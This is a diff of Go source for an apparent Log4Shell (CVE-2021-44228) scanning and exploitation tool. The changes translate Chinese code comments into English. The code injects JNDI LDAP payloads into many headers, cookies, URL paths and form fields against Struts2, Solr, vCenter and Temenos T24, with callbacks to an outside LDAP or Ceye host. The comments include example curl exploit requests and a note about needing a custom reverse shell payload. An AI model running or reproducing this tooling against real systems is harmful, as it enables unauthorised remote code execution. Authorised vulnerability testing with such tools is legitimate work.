@@ -34,8 +34,8 @@ func CheckX3(u string) bool {
 	return false
 }
 
-// log4j漏洞
-// Temenos T24 还没有找到目标测试
+// log4j vulnerability
+// Temenos T24 has not yet found a target to test
 // https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell?referrer=featured
 func CheckTemenosT24(u string) {
 	log.Printf("start test CheckTemenosT24 %s\n", u)
@@ -60,13 +60,14 @@ func CheckTemenosT24(u string) {
 	}
 }
 
-// 这里可以考虑对host进行编码，避免明文传输
+// Consider encoding the host here to avoid plaintext transmission
 func SetLdapHost(s string) string {
 	return fmt.Sprintf(util.GetVal("ldapServer"), s)
 }
 
-// log4j漏洞
-// 当前能上传jsp，但是不能解析、执行，需要定制 reverse shell的 payload
+// log4j vulnerability
+// Currently can upload jsp, but it cannot be parsed or executed;
+// a custom reverse shell payload is required
 func Solr(u string) {
 	log.Printf("start test Solr %s\n", u)
 	if oU, err := url.Parse(u); nil == err {
@@ -80,7 +81,7 @@ func Solr(u string) {
 	}
 }
 
-// log4j漏洞
+// log4j vulnerability
 // https://www.sprocketsecurity.com/resources/how-to-exploit-log4j-vulnerabilities-in-vmware-vcenter
 func VCenter(u string) bool {
 	log.Printf("start test VCenter %s\n", u)
@@ -101,7 +102,7 @@ func VCenter(u string) bool {
 	return false
 }
 
-// log4j盲大全套
+// log4j blind full-suite checks
 func Check(u string, finalURL string) bool {
 	if (util.CeyeApi != "" && util.CeyeDomain != "") || jndi.JndiAddress != "" {
 		var host = "null"
@@ -129,7 +130,7 @@ func Check(u string, finalURL string) bool {
 				// docker run -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
 				header["X-Api-Version"] = payload
 				//log.Println("payload", payload)
-				/* struts2 对静态文件 进行处理 If-Modified-Since，struts2默认静态文件
+				/* struts2 processes static files via If-Modified-Since; struts2's default static files
 				tooltip.gif
 				domtt.css
 				utils.js
@@ -157,7 +158,7 @@ func Check(u string, finalURL string) bool {
 				header["X-Device"] = payload
 				header["Token"] = payload
 				header["Cookie"] = "JSESSIONID=" + payload
-				// 包含strus2 根目录
+				// Includes the struts2 root directory
 				_, err := util.HttpRequset(domain+"/"+payload, "GET", "", false, header)
 				if nil != err {
 					log.Println("POST", domain+"/"+payload, err)
@@ -169,11 +170,11 @@ func Check(u string, finalURL string) bool {
 				_, _ = util.HttpRequset(finalURL, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 				_, _ = util.HttpRequset(domain, "POST", strings.Join(intputs, "="+payload+"&")+"="+payload, false, header)
 
-				/* stuts2 截取、保留第一级目录，两次payload url path
+				/* stuts2 keeps only the first-level directory of the path; both payload url paths
 				curl -vv http://localhost:8080/struts2-showcase/$%7Bjndi:ldap:$%7B::-/%7D/10.0.0.6:1270/abc%7D/
 				http://127.0.0.1:8080/$%7Bjndi:ldap://docker.for.mac.localhost:1389/UpX34defineClass%7D/xx.action
 				*/
-				// struts2 第二级目录处理
+				// struts2 second-level directory handling
 				if oU.Path != "" {
 					if a01 := strings.Split(oU.Path, "/"); 1 < len(a01) {
 						_, _ = util.HttpRequset(domain+"/"+a01[0]+"/"+payload, "GET", "", false, header)
